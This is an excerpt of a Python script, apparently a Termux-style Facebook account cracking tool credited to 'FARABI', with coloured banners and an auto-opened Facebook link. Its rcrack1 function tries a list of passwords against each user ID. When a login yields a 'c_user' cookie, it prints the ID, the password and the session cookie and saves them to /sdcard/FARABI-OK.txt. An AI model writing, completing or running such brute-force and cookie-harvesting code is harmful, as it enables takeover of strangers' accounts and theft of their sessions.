...
#--------------------------(COLOUR MIX)------------------------------#
os.system('clear')
print(f'\x1b[38;5;46mOPEN SOURCE BY FARABI-3200');time.sleep(1.5)
#--------------------------(COLOUR MIX)------------------------------#
#--------------------------(COLOUR BOX)--------------------------#    
...
\033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46mTOOLS MAKE\033[1;31m● \x1b[38;5;46mFOYSAL AHMED FARABI
...
class Main:
    def __init__(self):
        ...
        os.system("clear")
        print(logo)
        os.system('xdg-open https://www.facebook.com/61577963087977')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sFARABI-XD\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\r\r\033[1;32m[FARABI-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
                open('/sdcard/FARABI-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
